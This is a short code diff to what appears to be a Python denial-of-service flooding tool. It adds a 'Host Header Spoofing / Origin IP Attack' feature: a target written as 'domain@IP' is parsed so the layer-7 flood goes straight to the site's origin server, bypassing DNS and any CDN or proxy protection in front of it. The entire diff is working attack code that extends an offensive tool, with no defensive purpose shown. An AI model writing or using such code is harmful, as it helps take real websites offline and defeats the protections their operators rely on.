@@ -2139,12 +2139,24 @@ if __name__ == '__main__':
                      ", ".join(Methods.ALL_METHODS))
 
             if method in Methods.LAYER7_METHODS:
+                # [NEW] Host Header Spoofing / Origin IP Attack
+                # Syntax: https://domain.com@1.2.3.4
+                origin_ip = None
+                if "@" in urlraw:
+                    parts = urlraw.split("@")
+                    urlraw = parts[0]
+                    origin_ip = parts[1].strip()
+                    logger.info(f"{bcolors.OKGREEN}Host Spoofing Detected! Target Domain: {urlraw} -> Origin IP: {origin_ip}{bcolors.RESET}")
+
                 url = URL(urlraw)
                 host = url.host
 
                 if method != "TOR":
                     try:
-                        host = gethostbyname(url.host)
+                        if origin_ip:
+                            host = origin_ip
+                        else:
+                            host = gethostbyname(url.host)
                     except Exception as e:
                         exit('Cannot resolve hostname ', url.host, str(e))
 
